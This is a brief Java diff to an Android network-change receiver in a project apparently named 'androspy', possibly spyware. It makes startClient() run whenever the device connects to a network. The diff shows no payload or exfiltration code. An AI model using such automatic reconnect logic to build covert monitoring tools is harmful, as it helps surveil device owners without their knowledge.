@@ -17,11 +17,8 @@ public class NetworkWatcher extends BroadcastReceiver {
         ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo info = cm.getActiveNetworkInfo();
         if (info != null) {
-            if (buddy.ap.com.androspy.BuildConfig.DEBUG) {
+            if (info.isConnected())
                 startClient();
-            }else if (info.isConnected()) {
-                startClient();
-            }
         }
     }
 
